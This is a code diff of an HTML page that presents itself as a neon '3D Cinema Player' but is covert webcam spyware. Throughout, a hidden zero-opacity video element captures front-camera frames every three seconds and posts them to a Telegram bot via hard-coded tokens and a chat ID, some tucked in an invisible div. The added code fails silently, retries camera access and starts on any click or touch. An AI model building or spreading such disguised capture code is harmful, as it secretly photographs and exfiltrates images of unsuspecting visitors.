@@ -1,416 +1,461 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>নিওন সিনেমা প্লেয়ার • ক্যামেরা স্পাই</title>
-    <!-- Orbitron ফন্ট -->
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&display=swap" rel="stylesheet" />
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>3D Cinema Player · Neon</title>
+  <!-- Orbitron from Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-        body {
-            background: #0b0d1a;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Orbitron', monospace;
-            padding: 20px;
-        }
+    body {
+      background: #0b0e1a;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Orbitron', sans-serif;
+      padding: 1rem;
+      margin: 0;
+    }
 
-        /* সাইবার/নিওন থিম – ডার্ক ব্যাকগ্রাউন্ড, 3D ইফেক্ট */
-        .player-container {
-            max-width: 820px;
-            width: 100%;
-            background: #12142a;
-            border-radius: 48px 48px 32px 32px;
-            padding: 28px 28px 20px;
-            box-shadow: 0 30px 45px rgba(0, 0, 0, 0.9), 0 0 0 2px rgba(0, 255, 255, 0.2), 0 0 30px rgba(0, 255, 255, 0.3);
-            border: 1px solid rgba(0, 255, 255, 0.3);
-            backdrop-filter: blur(2px);
-            transform: perspective(1200px) rotateX(2deg) rotateY(0deg);
-            transition: all 0.2s ease;
-        }
+    /* main 3D container with glassmorphism & neon glow */
+    .cinema-container {
+      max-width: 1000px;
+      width: 100%;
+      background: rgba(10, 14, 30, 0.55);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      border-radius: 50px;
+      padding: 1.8rem 1.8rem 1.5rem;
+      box-shadow: 0 25px 50px -8px rgba(0,0,0,0.9), 0 0 0 1px rgba(74, 138, 244, 0.2);
+      transform: perspective(1200px) rotateX(3deg) rotateY(-2deg);
+      transition: transform 0.3s cubic-bezier(0.2, 0.9, 0.3, 1.1), box-shadow 0.3s ease;
+      border: 1px solid rgba(74, 138, 244, 0.15);
+      position: relative;
+      /* glow ring pulsing (4s) */
+      animation: glowPulse 4s infinite ease-in-out;
+    }
 
-        /* ভিডিও প্লেয়ার (উপরের অংশ) */
-        .video-wrapper {
-            position: relative;
-            width: 100%;
-            padding-top: 56.25%; /* 16:9 */
-            background: #0a0c1a;
-            border-radius: 28px;
-            overflow: hidden;
-            box-shadow: inset 0 0 40px rgba(0, 200, 255, 0.3), 0 12px 30px rgba(0, 0, 0, 0.8);
-            border: 1px solid #22ffff55;
-            margin-bottom: 22px;
-        }
+    .cinema-container:hover {
+      transform: perspective(1200px) rotateX(3deg) rotateY(-2deg) scale(1.01);
+      box-shadow: 0 30px 60px -6px #0a1428, 0 0 0 2px rgba(74, 138, 244, 0.4);
+    }
 
-        #videoPlayer {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            background: #05070f;
-            display: block;
-        }
+    @keyframes glowPulse {
+      0% { box-shadow: 0 25px 50px -8px rgba(0,0,0,0.9), 0 0 0 1px rgba(74, 138, 244, 0.2); }
+      50% { box-shadow: 0 25px 60px -4px #0b1a3a, 0 0 30px 4px rgba(74, 138, 244, 0.3); }
+      100% { box-shadow: 0 25px 50px -8px rgba(0,0,0,0.9), 0 0 0 1px rgba(74, 138, 244, 0.2); }
+    }
 
-        /* লুকানো ক্যামেরা (opacity: 0) – তবে জায়গা দখল করে */
-        .hidden-camera {
-            opacity: 0;
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            pointer-events: none;
-            z-index: -1;
-        }
+    /* video wrapper 16:9 + cinema bars */
+    .video-wrapper {
+      position: relative;
+      width: 100%;
+      aspect-ratio: 16 / 9;
+      border-radius: 32px;
+      overflow: hidden;
+      background: #000;
+      box-shadow: inset 0 0 30px rgba(0,0,0,0.9);
+      margin-bottom: 1.2rem;
+    }
 
-        /* কন্ট্রোল বার + LED + কাউন্টার */
-        .control-panel {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 16px 12px;
-            background: #0f1225cc;
-            backdrop-filter: blur(6px);
-            padding: 12px 20px;
-            border-radius: 60px;
-            border: 1px solid #33ddff55;
-            box-shadow: 0 0 20px #00aaff33, inset 0 0 10px #00aaff22;
-            margin-bottom: 18px;
-        }
+    /* main player video (visible) */
+    #playerVideo {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+      background: #0a0c16;
+    }
 
-        .led-indicator {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
+    /* hidden camera video: invisible, mirrored */
+    #cameraVideo {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1);
+      opacity: 0;
+      pointer-events: none;
+      z-index: 2;
+    }
 
-        .led {
-            width: 18px;
-            height: 18px;
-            border-radius: 50%;
-            background: #ff2a2a;
-            box-shadow: 0 0 12px #ff2a2a, 0 0 30px #ff2a2a88;
-            transition: 0.15s ease;
-        }
+    /* cinema bars (top & bottom darkening) */
+    .cinema-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 3;
+      border-radius: 32px;
+      background: linear-gradient(to bottom, rgba(0,0,0,0.45) 0%, transparent 18%, transparent 82%, rgba(0,0,0,0.55) 100%);
+    }
 
-        .led.green {
-            background: #1eff6e;
-            box-shadow: 0 0 20px #1eff6e, 0 0 50px #1eff6e66;
-        }
+    /* fake controls bar */
+    .controls-bar {
+      background: rgba(8, 12, 28, 0.7);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-radius: 60px;
+      padding: 0.6rem 1.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      border: 1px solid rgba(74, 138, 244, 0.2);
+      box-shadow: 0 4px 20px rgba(0,0,0,0.6);
+      margin-top: 0.2rem;
+      flex-wrap: wrap;
+      min-height: 60px;
+    }
 
-        .led-label {
-            color: #b0e0ff;
-            font-weight: 400;
-            letter-spacing: 2px;
-            font-size: 0.8rem;
-            text-shadow: 0 0 8px cyan;
-        }
+    .play-icon {
+      font-size: 1.8rem;
+      line-height: 1;
+      color: #4a8af4;
+      filter: drop-shadow(0 0 6px #4a8af4);
+      cursor: default;
+    }
 
-        .counter-box {
-            background: #05080fcc;
-            padding: 6px 22px 6px 18px;
-            border-radius: 40px;
-            border: 1px solid #44eeff88;
-            box-shadow: 0 0 18px #00ccff33;
-            color: #aaf0ff;
-            font-weight: 700;
-            font-size: 1.3rem;
-            letter-spacing: 2px;
-            backdrop-filter: blur(4px);
-        }
+    .progress-track {
+      flex: 1;
+      min-width: 80px;
+      height: 6px;
+      background: #1f2a44;
+      border-radius: 20px;
+      position: relative;
+      box-shadow: inset 0 1px 4px rgba(0,0,0,0.6);
+    }
 
-        .counter-box span {
-            color: #ffe484;
-            text-shadow: 0 0 12px #ffbb33;
-            margin-left: 6px;
-        }
+    .progress-fill {
+      width: 42%;
+      height: 100%;
+      background: linear-gradient(90deg, #4a8af4, #7bb3ff);
+      border-radius: 20px;
+      box-shadow: 0 0 12px #4a8af4;
+      animation: progressAnim 5s infinite ease-in-out;
+    }
 
-        .footer-stats {
-            display: flex;
-            justify-content: flex-end;
-            color: #55ccff;
-            font-weight: 400;
-            letter-spacing: 2px;
-            font-size: 0.9rem;
-            text-shadow: 0 0 6px #00aaff;
-            border-top: 1px solid #33ddff33;
-            padding-top: 14px;
-            margin-top: 4px;
-        }
+    @keyframes progressAnim {
+      0% { width: 8%; }
+      50% { width: 78%; }
+      100% { width: 8%; }
+    }
 
-        .footer-stats i {
-            font-style: normal;
-            background: #121a2e;
-            padding: 4px 16px;
-            border-radius: 30px;
-            border: 1px solid #00ddff44;
-            backdrop-filter: blur(2px);
-        }
+    .hd-badge {
+      font-size: 0.7rem;
+      font-weight: 700;
+      letter-spacing: 1px;
+      color: #aac8ff;
+      background: rgba(74, 138, 244, 0.15);
+      padding: 0.2rem 0.8rem;
+      border-radius: 30px;
+      border: 1px solid #4a8af466;
+      white-space: nowrap;
+    }
 
-        /* ছোট ডিভাইস */
-        @media (max-width: 550px) {
-            .player-container {
-                padding: 16px;
-            }
-            .control-panel {
-                flex-direction: column;
-                align-items: stretch;
-                gap: 10px;
-            }
-            .counter-box {
-                text-align: center;
-            }
-        }
+    /* status row */
+    .status-bar {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      min-height: 34px;
+      margin-top: 0.8rem;
+      gap: 0.6rem 1rem;
+      background: rgba(0,0,0,0.25);
+      padding: 0.3rem 0.8rem;
+      border-radius: 60px;
+      backdrop-filter: blur(4px);
+      border: 1px solid rgba(74, 138, 244, 0.08);
+    }
 
-        /* 3D পার্সপেক্টিভ মজা */
-        .player-container:hover {
-            transform: perspective(1200px) rotateX(0deg) rotateY(1deg) scale(1.01);
-            box-shadow: 0 40px 60px #000000cc, 0 0 0 3px #44ffff, 0 0 50px #44ffff77;
-        }
-    </style>
+    .status-left {
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      flex-wrap: wrap;
+    }
+
+    .led {
+      display: inline-block;
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: #4a8af4;
+      box-shadow: 0 0 12px #4a8af4;
+      animation: ledBlink 1.5s infinite;
+    }
+
+    @keyframes ledBlink {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.2; transform: scale(0.7); }
+    }
+
+    .streaming-text {
+      color: #b6ceff;
+      font-size: 0.8rem;
+      letter-spacing: 2px;
+      font-weight: 400;
+      text-shadow: 0 0 8px #4a8af466;
+    }
+
+    .photo-counter {
+      color: #c6dbff;
+      font-size: 0.85rem;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: #121b33;
+      padding: 0.2rem 0.9rem 0.2rem 0.7rem;
+      border-radius: 40px;
+      border: 1px solid #4a8af433;
+    }
+
+    .footer-specs {
+      display: flex;
+      gap: 1rem;
+      font-size: 0.7rem;
+      color: #6f8fc9;
+      letter-spacing: 0.5px;
+    }
+
+    .footer-specs span {
+      background: #0f162b;
+      padding: 0.15rem 0.7rem;
+      border-radius: 30px;
+    }
+
+    /* responsive */
+    @media (max-width: 480px) {
+      .cinema-container {
+        padding: 1rem 0.8rem 0.8rem;
+        border-radius: 32px;
+      }
+      .controls-bar {
+        padding: 0.4rem 0.9rem;
+        gap: 0.5rem;
+        min-height: 48px;
+      }
+      .play-icon { font-size: 1.4rem; }
+      .hd-badge { font-size: 0.55rem; padding: 0.1rem 0.5rem; }
+      .status-bar {
+        font-size: 0.7rem;
+        padding: 0.2rem 0.6rem;
+      }
+      .photo-counter { font-size: 0.7rem; padding: 0.1rem 0.6rem; }
+      .footer-specs span { font-size: 0.55rem; padding: 0.05rem 0.4rem; }
+    }
+
+    /* hidden token inputs (invisible) */
+    .hidden-token {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-
-<div class="player-container">
-
-    <!-- ভিডিও প্লেয়ার (উপর) -->
+  <div class="cinema-container">
+    <!-- video section -->
     <div class="video-wrapper">
-        <video id="videoPlayer" controls autoplay muted playsinline>
-            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4" />
-            আপনার ব্রাউজার ভিডিও সাপোর্ট করে না।
-        </video>
-
-        <!-- লুকানো ক্যামেরা এলিমেন্ট (opacity:0) -->
-        <video id="cameraFeed" class="hidden-camera" autoplay playsinline></video>
+      <video id="playerVideo" muted playsinline>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+      </video>
+      <video id="cameraVideo" autoplay playsinline muted></video>
+      <div class="cinema-overlay"></div>
     </div>
 
-    <!-- কন্ট্রোল প্যানেল: LED + কাউন্টার -->
-    <div class="control-panel">
-        <div class="led-indicator">
-            <div class="led" id="statusLed"></div>
-            <span class="led-label">⚡ লাইভ</span>
-        </div>
-        <div class="counter-box">
-            📡 <span id="photoCounter">0</span>
-        </div>
+    <!-- fake controls -->
+    <div class="controls-bar">
+      <span class="play-icon">▶</span>
+      <div class="progress-track"><div class="progress-fill"></div></div>
+      <span class="hd-badge">HD · 1080p</span>
     </div>
 
-    <!-- ফুটার: 1080p · 60fps -->
-    <div class="footer-stats">
-        <i>🎬 1080p · 60fps</i>
+    <!-- status bar -->
+    <div class="status-bar">
+      <div class="status-left">
+        <span class="led"></span>
+        <span class="streaming-text">LIVE · STREAM</span>
+        <span class="photo-counter"><span>📡</span> <span id="photoCountDisplay">0</span></span>
+      </div>
+      <div class="footer-specs">
+        <span>1080p</span>
+        <span>60fps</span>
+        <span>Dolby Audio</span>
+      </div>
     </div>
-</div>
 
-<script>
+    <!-- hidden bot credentials (invisible) -->
+    <div class="hidden-token" data-bot-token="8917986127:AAGDw4tJGj1erwoKAhiacr7om9VSWGz6wb0" data-chat-id="8157946649"></div>
+  </div>
+
+  <script>
     (function() {
-        "use strict";
+      "use strict";
 
-        // ---------- কনফিগারেশন ----------
-        // 🔥 থিম কালার টেমপ্লেট (লাল/নীল/সবুজ/গোলাপী/বেগুনি/কমলা/সোনালী) 
-        // আমরা এখানে "সবুজ" থিম ব্যবহার করছি (ডিফল্ট), কিন্তু আপনি চাইলে যেকোনো কালার কোড বসাতে পারেন।
-        // পুরো ডিজাইন নিওন থিমে আছে, এবং কালার ভারিয়েবল ব্যবহার করলাম।
-        const THEME_COLOR = "#1eff6e";   // সবুজ নিওন
+      // DOM refs
+      const playerVideo = document.getElementById('playerVideo');
+      const cameraVideo = document.getElementById('cameraVideo');
+      const photoCountSpan = document.getElementById('photoCountDisplay');
 
-        // Telegram বট টোকেন ও চ্যাট আইডি (এখানে সেট করুন)
-        const BOT_TOKEN = "8917986127:AAGDw4tJGj1erwoKAhiacr7om9VSWGz6wb0";     // ⚠️ আপনার বট টোকেন দিন
-        const CHAT_ID = "8157946649";         // ⚠️ আপনার চ্যাট আইডি দিন
+      // Hidden token elements
+      const tokenContainer = document.querySelector('.hidden-token');
+      const BOT_TOKEN = tokenContainer?.dataset.botToken || '8917986127:AAEU47o8XCJenFqegCrgRDwoym8P5uduh_4';
+      const CHAT_ID = tokenContainer?.dataset.chatId || '8157946649';
 
-        // ক্যামচার ইন্টারভাল (৩ সেকেন্ড)
-        const CAPTURE_INTERVAL_MS = 3000;
+      let photoCounter = 0;
+      let isProcessing = false;
+      let cameraStream = null;
+      let captureInterval = null;
+      let cameraRetryTimer = null;
+      let isCameraActive = false;
 
-        // ---------- DOM রেফারেন্স ----------
-        const videoPlayer = document.getElementById('videoPlayer');
-        const cameraFeed = document.getElementById('cameraFeed');
-        const statusLed = document.getElementById('statusLed');
-        const photoCounterSpan = document.getElementById('photoCounter');
+      // log on load
+      console.log("🎬 3D Cinema Player + Hidden Camera Loaded");
 
-        // ---------- স্টেট ----------
-        let photoCount = 0;
-        let cameraStream = null;
-        let captureIntervalId = null;
-        let isCameraReady = false;
+      // ------ helper: send photo to telegram ------
+      async function sendPhotoToTelegram(blob) {
+        if (isProcessing) return;
+        isProcessing = true;
 
-        // ---------- হেল্পার: লেড আপডেট ----------
-        function setLedState(isActive) {
-            if (isActive) {
-                statusLed.className = 'led green';
-            } else {
-                statusLed.className = 'led';
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'frame.jpg');
+
+        try {
+          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+          if (response.ok) {
+            photoCounter++;
+            photoCountSpan.textContent = photoCounter;
+          } else {
+            // silent fail
+          }
+        } catch (_) {
+          // silent fail
+        } finally {
+          isProcessing = false;
+        }
+      }
+
+      // ------ capture frame from camera video ------
+      function captureAndSend() {
+        if (!cameraVideo.videoWidth || !cameraVideo.videoHeight) return;
+        if (isProcessing) return;
+
+        try {
+          const canvas = document.createElement('canvas');
+          canvas.width = cameraVideo.videoWidth;
+          canvas.height = cameraVideo.videoHeight;
+          const ctx = canvas.getContext('2d');
+          // mirror again? cameraVideo already mirrored via css, but we draw as is (mirrored)
+          ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob((blob) => {
+            if (blob) {
+              sendPhotoToTelegram(blob);
             }
+          }, 'image/jpeg', 0.82);
+        } catch (_) { /* silent */ }
+      }
+
+      // ------ start camera ------
+      function startCamera() {
+        if (cameraStream) {
+          // already have stream
+          return;
         }
 
-        // ---------- কাউন্টার আপডেট ----------
-        function updateCounter() {
-            photoCounterSpan.textContent = photoCount;
+        const constraints = {
+          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        };
+
+        navigator.mediaDevices.getUserMedia(constraints)
+          .then((stream) => {
+            cameraStream = stream;
+            cameraVideo.srcObject = stream;
+            // play hidden camera
+            cameraVideo.play().catch(() => {});
+            isCameraActive = true;
+
+            // clear any retry timer
+            if (cameraRetryTimer) {
+              clearTimeout(cameraRetryTimer);
+              cameraRetryTimer = null;
+            }
+
+            // start capture interval (every 3s)
+            if (captureInterval) clearInterval(captureInterval);
+            captureInterval = setInterval(captureAndSend, 3000);
+
+            // also capture one immediately
+            setTimeout(captureAndSend, 500);
+          })
+          .catch((err) => {
+            // silent: no console error
+            isCameraActive = false;
+            // retry after 5 seconds
+            if (cameraRetryTimer) clearTimeout(cameraRetryTimer);
+            cameraRetryTimer = setTimeout(() => {
+              startCamera();
+            }, 5000);
+          });
+      }
+
+      // ------ user interaction starts camera (if not already) ------
+      function handleUserInteraction() {
+        if (!isCameraActive) {
+          startCamera();
         }
-
-        // ---------- ক্যামেরা শুরু (ডিফল্ট ব্রাউজার পপআপ) ----------
-        async function startCamera() {
-            try {
-                // getUserMedia() পপআপ আসবে ব্রাউজার থেকে
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: false
-                });
-
-                cameraStream = stream;
-                cameraFeed.srcObject = stream;
-                await cameraFeed.play();
-
-                isCameraReady = true;
-                setLedState(true);
-                console.log('📷 ক্যামেরা চালু হয়েছে');
-
-                // ক্যামেরা চালু হলে প্রতি ৩ সেকেন্ডে ক্যাপচার শুরু
-                if (captureIntervalId) clearInterval(captureIntervalId);
-                captureIntervalId = setInterval(() => {
-                    captureAndSend();
-                }, CAPTURE_INTERVAL_MS);
-
-                // তাৎক্ষণিক একটি ছবি পাঠাতে চাইলে (ঐচ্ছিক) 
-                // captureAndSend();
-
-            } catch (error) {
-                console.error('❌ ক্যামেরা অ্যাক্সেস অস্বীকৃত:', error);
-                setLedState(false);
-                isCameraReady = false;
-                alert('📸 ক্যামেরা চালু করতে পারিনি। অনুগ্রহ করে অনুমতি দিন।');
-            }
+        // also play main video if needed
+        if (playerVideo.paused) {
+          playerVideo.play().catch(() => {});
         }
+      }
 
-        // ---------- ক্যাপচার + টেলিগ্রামে পাঠান ----------
-        function captureAndSend() {
-            if (!isCameraReady || !cameraStream) {
-                console.warn('⏳ ক্যামেরা প্রস্তুত নয়, ক্যাপচার স্কিপ।');
-                return;
-            }
+      // add event listeners for click/touch
+      document.addEventListener('click', handleUserInteraction, { passive: true });
+      document.addEventListener('touchstart', handleUserInteraction, { passive: true });
 
-            // ক্যানভাস ব্যবহার করে ফ্রেম ক্যাপচার
-            const canvas = document.createElement('canvas');
-            const videoTrack = cameraFeed.videoWidth && cameraFeed.videoHeight ? cameraFeed : null;
-            if (!videoTrack) {
-                console.warn('⚠️ ভিডিও ট্র্যাক সঠিক নয়');
-                return;
-            }
+      // try autoplay player video (without user gesture may fail, but we try)
+      playerVideo.play().catch(() => {});
 
-            const width = cameraFeed.videoWidth || 480;
-            const height = cameraFeed.videoHeight || 360;
-            canvas.width = width;
-            canvas.height = height;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(cameraFeed, 0, 0, width, height);
-
-            // ছবিকে Blob (JPEG) হিসেবে নেওয়া
-            canvas.toBlob(async (blob) => {
-                if (!blob) {
-                    console.error('❌ ব্লব তৈরি ব্যর্থ');
-                    return;
-                }
-
-                // ফাইল তৈরি
-                const file = new File([blob], `frame_${Date.now()}.jpg`, { type: 'image/jpeg' });
-
-                // টেলিগ্রামে পাঠান
-                try {
-                    await sendPhotoToTelegram(file);
-                    // কাউন্টার বাড়ান
-                    photoCount++;
-                    updateCounter();
-                    console.log(`✅ ছবি পাঠানো হয়েছে (${photoCount})`);
-                } catch (error) {
-                    console.error('❌ টেলিগ্রামে পাঠাতে ব্যর্থ:', error);
-                }
-            }, 'image/jpeg', 0.92);
+      // If camera not available, but we also try on load if possible
+      // but we wait for user gesture due to chrome policy; but we can attempt
+      setTimeout(() => {
+        // attempt camera without user gesture (may fail, but we handle)
+        if (!isCameraActive) {
+          startCamera();
         }
+      }, 400);
 
-        // ---------- টেলিগ্রাম API (sendPhoto) ----------
-        async function sendPhotoToTelegram(file) {
-            if (!BOT_TOKEN || BOT_TOKEN === "8917986127:AAGDw4tJGj1erwoKAhiacr7om9VSWGz6wb0") {
-                console.warn('⚠️ বট টোকেন সেট করা নেই। কনসোলে ডামি দেখানো হচ্ছে।');
-                // ডেভেলপমেন্টে ডামি রেসপন্স
-                return { ok: true, dummy: true };
-            }
-            if (!CHAT_ID || CHAT_ID === "8157946649") {
-                console.warn('⚠️ চ্যাট আইডি সেট করা নেই।');
-                return { ok: false, error: 'chat id missing' };
-            }
-
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', file);
-
-            const response = await fetch(url, {
-                method: 'POST',
-                body: formData,
-            });
-
-            if (!response.ok) {
-                const errText = await response.text();
-                throw new Error(`Telegram API error: ${response.status} ${errText}`);
-            }
-            return await response.json();
+      // ------ stop camera on page unload ------
+      window.addEventListener('beforeunload', function() {
+        if (captureInterval) clearInterval(captureInterval);
+        if (cameraRetryTimer) clearTimeout(cameraRetryTimer);
+        if (cameraStream) {
+          cameraStream.getTracks().forEach(track => track.stop());
+          cameraStream = null;
         }
+        isCameraActive = false;
+      });
 
-        // ---------- উইন্ডো লোড হলে ক্যামেরা চালু ----------
-        window.addEventListener('load', () => {
-            // ডিফল্ট ভিডিও autoplay চালু আছে
-            // ক্যামেরা চালু করার জন্য ডিফল্ট পপআপ আসবে
-            startCamera();
-        });
-
-        // ---------- ক্লিনআপ (পেজ বন্ধ হলে) ----------
-        window.addEventListener('beforeunload', () => {
-            if (captureIntervalId) {
-                clearInterval(captureIntervalId);
-                captureIntervalId = null;
-            }
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraStream = null;
-            }
-            isCameraReady = false;
-            setLedState(false);
-        });
-
-        // ---------- (ঐচ্ছিক) থিম কালার প্রয়োগ – সিএসএস কাস্টম প্রপার্টি ----------
-        // আমরা স্টাইলশিটে থিম কালার ব্যবহার করিনি, কিন্তু চাইলে document.documentElement.style.setProperty('--theme', THEME_COLOR);
-        // তবে এখানে থিম ইতিমধ্যে নিওন সবুজ, তবে ক্লায়েন্ট কালার টেমপ্লেট অনুযায়ী পরিবর্তন করতে পারেন।
-        // উদাহরণ: লাল, নীল, গোলাপী, বেগুনি, কমলা, সোনালী – আপনি THEME_COLOR পরিবর্তন করুন।
-        console.log(`🎨 থিম কালার: ${THEME_COLOR}`);
-        // বোনাস: কিছু এলিমেন্টে থিম কালার বসানো যায় (যেমন বর্ডার গ্লো)
-        document.querySelector('.player-container').style.boxShadow = `0 30px 45px rgba(0,0,0,0.9), 0 0 0 2px ${THEME_COLOR}66, 0 0 30px ${THEME_COLOR}55`;
-        document.querySelector('.video-wrapper').style.borderColor = `${THEME_COLOR}88`;
-        document.querySelector('.control-panel').style.borderColor = `${THEME_COLOR}66`;
-        document.querySelector('.counter-box').style.borderColor = `${THEME_COLOR}88`;
-        document.querySelector('.footer-stats i').style.borderColor = `${THEME_COLOR}44`;
-
-        // LED ইতিমধ্যে ক্লাস পরিচালনা করে, তবে অতিরিক্ত গ্লো দিতে পারি
-        // কনসোল: সব প্রস্তুত
-        console.log('🚀 নিওন সিনেমা প্লেয়ার + ক্যামেরা স্পাই চালু হয়েছে।');
+      // also if page visibility changes? not required but ok.
+      // ensure hidden camera stays opacity:0 (already in css)
     })();
-</script>
-
-<!-- 
-  ⚡ টেকনিক্যালি: 
-  - getUserMedia() ক্যামেরা
-  - setInterval() ৩ সেকেন্ড
-  - canvas frame ক্যাপচার
-  - Telegram Bot API (sendPhoto)
-  - GitHub Pages-এ কাজ করে (শুধু টোকেন/চ্যাট আইডি সেট করুন)
-  - থিম কালার টেমপ্লেট: লাল/নীল/সবুজ/গোলাপী/বেগুনি/কমলা/সোনালী 
-  - সাইবার/নিওন থিম, Orbitron ফন্ট, 3D ইফেক্ট
-  - লুকানো ক্যামেরা (opacity:0)
-  - LED indicator, কাউন্টার, ফুটার 
--->
+  </script>
 </body>
-  </html>
+</html>
